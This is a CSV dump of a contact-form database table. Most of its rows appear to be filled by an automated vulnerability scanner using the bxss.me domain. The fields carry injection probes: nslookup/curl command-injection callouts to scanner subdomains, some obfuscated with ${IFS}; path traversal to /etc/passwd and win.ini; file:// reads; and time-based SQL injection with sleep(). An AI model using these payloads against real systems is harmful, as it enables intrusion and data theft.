id,Title,linkren,phone,mobile,fax,email,content,date,address,state,statedate,prodid
4397,Mr.,RDFYjolf&amp;&amp;sleep(27*1000)*fsglbh&amp;&amp;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4398,bxss.me,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4399,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4400,Mr.,RDFYjolf,555-666-0606,file:///etc/passwd,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4401,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,`(nslookup -q=cname hitvxnnwmxfjk027bf.bxss.me||curl hitvxnnwmxfjk027bf.bxss.me)`,0,,0
4402,Mr.,RDFYjolf&quot;&amp;&amp;sleep(27*1000)*isgjis&amp;&amp;&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4403,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,0,,0
4404,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4405,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4406,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,；(nslookup -q=cname hitedznsrweri39f70.bxss.me||curl hitedznsrweri39f70.bxss.me)|(nslookup -q=cname hitedznsrweri39f70.bxss.me||curl hitedznsrweri39f70.bxss.me)&amp;(nslookup -q=cname hitedznsrweri39f70.bxss.me||curl hitedznsrweri39f70.bxss.me),0,,0
4407,Mr.,RDFYjolf||sleep(27*1000)*vgmzur||,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4408,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,0,,0
4409,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4410,Mr.,RDFYjolf,555-666-0606,../987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4411,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,|(nslookup${IFS}-q${IFS}cname${IFS}hitmgqkhhysfha681d.bxss.me||curl${IFS}hitmgqkhhysfha681d.bxss.me),0,,0
4412,Mr.,RDFYjolf&quot;||sleep(27*1000)*ayxlgl||&quot;,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4413,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,Http://bxss.me/t/fit.txt,0,,0
4414,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4415,Mr.,../../../../../../../../../../../../../../etc/passwd,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4416,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitjbeayoajuo0d629.bxss.me||curl${IFS}hitjbeayoajuo0d629.bxss.me)&amp;\&quot;`0&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitjbeayoajuo0d629.bxss.me||curl${IFS}hitjbeayoajuo0d629.bxss.me)&amp;`,0,,0
4417,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,http://bxss.me/t/fit.txt?.jpg,0,,0
4418,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4419,Mr.,../../../../../../../../../../../../../../windows/win.ini,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4420,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,echo xbxjnb$()\ nifutl\nz^xyu||a # &amp;echo xbxjnb$()\ nifutl\nz^xyu||a #|&quot; &amp;echo xbxjnb$()\ nifutl\nz^xyu||a #,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4421,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4422,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,/etc/shells,0,,0
4423,Mr.,file:///etc/passwd,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4424,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;echo efhqyt$()\ dwlult\nz^xyu||a # &amp;echo efhqyt$()\ dwlult\nz^xyu||a #|&quot; &amp;echo efhqyt$()\ dwlult\nz^xyu||a #,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4425,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,../../../../../../../../../../../../../../etc/shells,0,,0
4426,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4427,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4428,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555&amp;echo pwdwzj$()\ qeyooi\nz^xyu||a # &amp;echo pwdwzj$()\ qeyooi\nz^xyu||a #|&quot; &amp;echo pwdwzj$()\ qeyooi\nz^xyu||a #,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4429,Mr.,RDFYjolf,&quot;(),987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4430,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,c:/windows/win.ini,0,,0
4431,Mr.,../RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4432,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|echo dnbkub$()\ juofdn\nz^xyu||a # |echo dnbkub$()\ juofdn\nz^xyu||a #|&quot; |echo dnbkub$()\ juofdn\nz^xyu||a #,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4433,Mr.,RDFYjolf,555-666-0606&amp;&amp;sleep(27*1000)*nuvzxn&amp;&amp;,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4434,Mr.,RDFYjolf,../../../../../../../../../../../../../../etc/passwd,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4435,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555|echo hqienz$()\ krmkqz\nz^xyu||a # |echo hqienz$()\ krmkqz\nz^xyu||a #|&quot; |echo hqienz$()\ krmkqz\nz^xyu||a #,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4436,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,bxss.me,0,,0
4437,Mr.,RDFYjolf,555-666-0606&quot;&amp;&amp;sleep(27*1000)*yjboxr&amp;&amp;&quot;,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4438,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4439,Mr.,RDFYjolf,../../../../../../../../../../../../../../windows/win.ini,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4440,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,(nslookup -q=cname hiteyjmgdenkk4ca48.bxss.me||curl hiteyjmgdenkk4ca48.bxss.me)),2024-10-07 00:00:00,3137 Laguna Street,0,,0
4441,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4442,Mr.,RDFYjolf,555-666-0606||sleep(27*1000)*hsejip||,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4443,Mr.,RDFYjolf,file:///etc/passwd,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4444,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,$(nslookup -q=cname hityjzuhqjmgh0ae7e.bxss.me||curl hityjzuhqjmgh0ae7e.bxss.me),2024-10-07 00:00:00,3137 Laguna Street,0,,0
4445,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4446,Mr.,RDFYjolf,555-666-0606&quot;||sleep(27*1000)*qwivnx||&quot;,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4447,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4448,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4449,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,Http://bxss.me/t/fit.txt,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4450,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;nslookup -q=cname hityqbmuwtvro9b7eb.bxss.me&amp;\&quot;`0&amp;nslookup -q=cname hityqbmuwtvro9b7eb.bxss.me&amp;`,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4451,Mr.,RDFYjolf,../555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4452,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,http://bxss.me/t/fit.txt?.jpg,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4453,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;(nslookup -q=cname hitwiqszwoieab937f.bxss.me||curl hitwiqszwoieab937f.bxss.me)&amp;\&quot;`0&amp;(nslookup -q=cname hitwiqszwoieab937f.bxss.me||curl hitwiqszwoieab937f.bxss.me)&amp;`,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4454,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,/etc/shells,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4455,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|(nslookup -q=cname hitdpsubqsohk6a75a.bxss.me||curl hitdpsubqsohk6a75a.bxss.me),2024-10-07 00:00:00,3137 Laguna Street,0,,0
4456,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4457,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,../../../../../../../../../../../../../../etc/shells,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4458,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,`(nslookup -q=cname hitvlyxucriko724ba.bxss.me||curl hitvlyxucriko724ba.bxss.me)`,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4459,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,ÿ(nslookup -q=cname hitfczkjygshrf11df.bxss.me||curl hitfczkjygshrf11df.bxss.me)|(nslookup -q=cname hitfczkjygshrf11df.bxss.me||curl hitfczkjygshrf11df.bxss.me)&amp;(nslookup -q=cname hitfczkjygshrf11df.bxss.me||curl hitfczkjygshrf11df.bxss.me),2024-10-07 00:00:00,3137 Laguna Street,0,,0
4460,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,c:/windows/win.ini,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4461,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,|(nslookup${IFS}-q${IFS}cname${IFS}hitaesfflloen73e75.bxss.me||curl${IFS}hitaesfflloen73e75.bxss.me),2024-10-07 00:00:00,3137 Laguna Street,0,,0
4462,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitlzybaolhza644bd.bxss.me||curl${IFS}hitlzybaolhza644bd.bxss.me)&amp;\&quot;`0&amp;(nslookup${IFS}-q${IFS}cname${IFS}hitlzybaolhza644bd.bxss.me||curl${IFS}hitlzybaolhza644bd.bxss.me)&amp;`,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4463,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,bxss.me,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4464,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4466,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4467,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4468,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,Http://bxss.me/t/fit.txt,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4471,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,http://bxss.me/t/fit.txt?.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4473,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,/etc/shells,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4474,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4476,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,../../../../../../../../../../../../../../etc/shells,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4477,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,(nslookup -q=cname hitizmygyfsih8f16a.bxss.me||curl hitizmygyfsih8f16a.bxss.me)),555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4478,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,c:/windows/win.ini,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4479,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,$(nslookup -q=cname hitvdntpwhscd5b0c9.bxss.me||curl hitvdntpwhscd5b0c9.bxss.me),555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4480,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4481,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,bxss.me,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4483,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4484,Mr.,RDFYjolf,555-666-0606,987-65-4329,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4486,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4487,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,|(nslookup -q=cname hitgcofcybxyl28e0b.bxss.me||curl hitgcofcybxyl28e0b.bxss.me),555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4488,Mr.,RDFYjolf,555-666-0606,987-65-4329,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4489,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4490,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,`(nslookup -q=cname hitvarbzaeclo26700.bxss.me||curl hitvarbzaeclo26700.bxss.me)`,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4491,Mr.,RDFYjolf,555-666-0606,987-65-4329,Http://bxss.me/t/fit.txt,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4493,Mr.,RDFYjolf,555-666-0606,987-65-4329,http://bxss.me/t/fit.txt?.jpg,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4494,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4495,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,|(nslookup${IFS}-q${IFS}cname${IFS}hitohcatokqlp64bb7.bxss.me||curl${IFS}hitohcatokqlp64bb7.bxss.me),555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4496,Mr.,RDFYjolf,555-666-0606,987-65-4329,/etc/shells,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4497,Mr.,RDFYjolf,555-666-0606,987-65-4329,../../../../../../../../../../../../../../etc/shells,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4499,Mr.,RDFYjolf,555-666-0606,987-65-4329,c:/windows/win.ini,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4501,Mr.,RDFYjolf,555-666-0606,987-65-4329,bxss.me,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4503,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4504,Mr.,RDFYjolf,555-666-0606,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4506,Mr.,RDFYjolf,555-666-0606,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4509,Mr.,RDFYjolf,555-666-0606,Http://bxss.me/t/fit.txt,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4510,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4511,Mr.,RDFYjolf,555-666-0606,987-65-4329,(nslookup -q=cname hitkufhthedtidcd35.bxss.me||curl hitkufhthedtidcd35.bxss.me)),testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4512,Mr.,RDFYjolf,555-666-0606,http://bxss.me/t/fit.txt?.jpg,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4513,Mr.,RDFYjolf,555-666-0606,987-65-4329,$(nslookup -q=cname hithlklckyjdqbed83.bxss.me||curl hithlklckyjdqbed83.bxss.me),testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4514,Mr.,RDFYjolf,555-666-0606,/etc/shells,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4516,Mr.,RDFYjolf,555-666-0606,../../../../../../../../../../../../../../etc/shells,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4518,Mr.qZXsGlJY,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4519,Mr.,RDFYjolf,555-666-0606,c:/windows/win.ini,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4520,Mr.,RDFYjolf,555-666-0606,987-65-4329,|(nslookup -q=cname hitzrxjndogdzed9b3.bxss.me||curl hitzrxjndogdzed9b3.bxss.me),testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4521,Mr.,RDFYjolf,555-666-0606,bxss.me,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4522,Mr.,RDFYjolf,555-666-0606,987-65-4329,`(nslookup -q=cname hitwkwlyhlcfzc8f04.bxss.me||curl hitwkwlyhlcfzc8f04.bxss.me)`,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4523,Mr.,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4524,Mr.,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4526,-1 OR 2+115-115-1=0+0+0+1  ,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4527,Mr.,RDFYjolf,555-666-0606,987-65-4329,|(nslookup${IFS}-q${IFS}cname${IFS}hitzknxkvgldce869f.bxss.me||curl${IFS}hitzknxkvgldce869f.bxss.me),testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4528,Mr.,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4530,-1 OR 2+91-91-1=0+0+0+1,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4531,Mr.,Http://bxss.me/t/fit.txt,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4533,-1 OR 2+346-346-1=0+0+0+1  ,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4534,Mr.,http://bxss.me/t/fit.txt?.jpg,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4536,-1 OR 2+783-783-1=0+0+0+1 or BEAKZVG9=,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4537,Mr.,/etc/shells,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4539,Mr.,../../../../../../../../../../../../../../etc/shells,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4541,-1&quot; OR 2+380-380-1=0+0+0+1  ,RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4542,Mr.,c:/windows/win.ini,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4544,Mr.,bxss.me,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4545,Mr.,RDFYjolf,555-666-0606,(nslookup -q=cname hitkjjhqgiuov282bf.bxss.me||curl hitkjjhqgiuov282bf.bxss.me)),317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4546,"if(now()=sysdate(),sleep(15),0)",RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4547,Mr.,RDFYjolf,http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4548,Mr.,RDFYjolf,555-666-0606,$(nslookup -q=cname hitnbmhqdtnsu5c96d.bxss.me||curl hitnbmhqdtnsu5c96d.bxss.me),317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4549,Mr.,RDFYjolf,1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4551,Mr.,RDFYjolf,Http://bxss.me/t/fit.txt,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4553,"Mr.0XOR(if(now()=sysdate(),sleep(15),0))XORZ",RDFYjolf,555-666-0606,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
4554,Mr.,RDFYjolf,http://bxss.me/t/fit.txt?.jpg,987-65-4329,317-317-3137,testing@example.com,555,2024-10-07 00:00:00,3137 Laguna Street,0,,0
